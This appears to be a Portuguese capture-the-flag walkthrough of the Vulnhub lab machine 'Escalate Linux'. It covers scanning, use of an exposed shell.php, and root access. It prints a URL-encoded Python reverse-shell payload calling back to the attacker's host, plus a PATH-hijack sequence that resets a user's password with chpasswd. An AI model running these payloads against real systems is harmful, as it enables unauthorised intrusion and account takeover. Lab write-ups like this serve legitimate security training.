---
title: Vulnhub - Escalate Linux
categories: [Vulnhub]
#tags: []
render_with_liquid: false
image: https://0xPurpl3john.github.io/assets/img/Vulnhub/escalate_linux/capa.png
---


## Link da Maquina: <https://www.vulnhub.com/entry/escalate_linux-1,323/>
---

## Olá

Aproveite.

## Scanning web and services

### Host Discovery

Inicialmente, foi realizado um escaneamento na rede em busca do IP da máquina alvo.

```bash
sudo nmap -sn 10.0.2.1-255
```

> O parâmetro `-sn` tem como finalidade realizar um ping scan.
> 

![scan nmap 10.0.2.9](/assets/img/Vulnhub/escalate_linux/scannmap.png)

### Port Discovery

Já com o IP alvo em mãos, foi utilizado o comando abaixo para obter mais informações a respeito das portas e serviços que estariam em funcionamento no alvo. O comando abaixo é dividido em duas partes, primeiramente realiza um escaneamento em todas as `65535 portas` existentes e as filtra, armazenando tudo na variável `ports` que é utilizada na segunda parte do comando.

```bash
ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.0.2.9 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sV -p $ports 10.0.2.9
```

![scan nmap ports 10.0.2.9](/assets/img/Vulnhub/escalate_linux/scannmapports.png)

## Enumeration

### Port 80 - Apache httpd 2.4.29

Para enumeração da porta em questão, primeiramente foi inserido no navegador e o que estava rodando era uma página padrão do apache. Logo, foi iniciado a utilização da ferramenta *dirbuster* para enumeração de diretórios conforme as figuras abaixo.

![port 80 - apache](/assets/img/Vulnhub/escalate_linux/port80apache.png)

![dirbuster](/assets/img/Vulnhub/escalate_linux/dirbuster.png)

Foi descoberto a partir da ferramenta supracitada a existência de um arquivo denominado `shell.php`. Ao acessar o diretório havia a mensagem “pass cmd as get parameter” logo, foi realizado uma tentativa de utilizar o comando solicitado na url com o comando `pwd` e foi obtido o resultado abaixo.

![Shell.php](/assets/img/Vulnhub/escalate_linux/shellphp.png)

O comando `pwd` funcionou! Logo, temos um grande problema aqui.

> Foram feitas tentativas de upload de arquivos, porém os arquivos não foram encontrados (mas não passei muito tempo procurando).
> 

Após, foi realizado uma tentativa de obter uma *shell* através de um script *python* encodado e a partir disso foi possível entrar na maquina com sucesso.

```
http://10.0.2.9/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.2.6%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27
```

### Shell Obtido

Utilizando o código em *python* para obter uma shell reversa e a ferramenta *nc* como listener, conseguimos a *shell*.

![Shell Obtido](/assets/img/Vulnhub/escalate_linux/shellobtido.png)

## Privilege Escalation

A partir do momento que foi obtido a *shell* na máquina alvo, foram realizados procedimentos padrão em busca da escalação de privilégios.

Também, foi realizado o download do arquivo *[LinEnum.sh](http://LinEnum.sh),* através de um server simples em python na minha máquina, para realizar uma enumeração automatizada de alguns pontos interessantes da máquina alvo.

![linenum.sh](/assets/img/Vulnhub/escalate_linux/linenumsh.png)

![linenum result](/assets/img/Vulnhub/escalate_linux/linenumsh-result1.png)

![linenum result-2](/assets/img/Vulnhub/escalate_linux/linenumsh-result2.png)

A ferramenta trouxe diversos pontos interessantes, destaquei dois nas imagens acima.

> É importante ressaltar que essa máquina possui diversos modos para escalação de privilégios. Aqui, será feito apenas um.
> 

Para nossa escalação de privilégios, primeiramente foi verificado a existência do arquivo do diretório `/home/user5/script` e ao utiliza-lo, o mesmo apresenta a mesma função do comando `ls`. Com isso em mente, foi feito um roubo de path, para que o script em questão executasse o `ls` que criamos.

- `echo ‘echo “user1:user1” | chpasswd’ > ls`
- `chmod 777 ls`
- `export PATH= tmp:$PATH`

![ls tmp](/assets/img/Vulnhub/escalate_linux/lstmp.png)

Conforme imagem acima, ao executar o script, o mesmo irá executar o comando `ls` que acabamos de criar. Com isso, a senha do usuário `user1` foi alterada e podemos trocar de usuário.

No usuário `user1` foram realizados procedimentos padrão em busca da escalação de privilégios e o comando `sudo -l` nos trouxe como resposta que o usuário `user1` possuía permissão de executar tudo.

- `sudo su`

![Acesso root](/assets/img/Vulnhub/escalate_linux/rootobtido.png)

### Root obtido Escalate_Linux!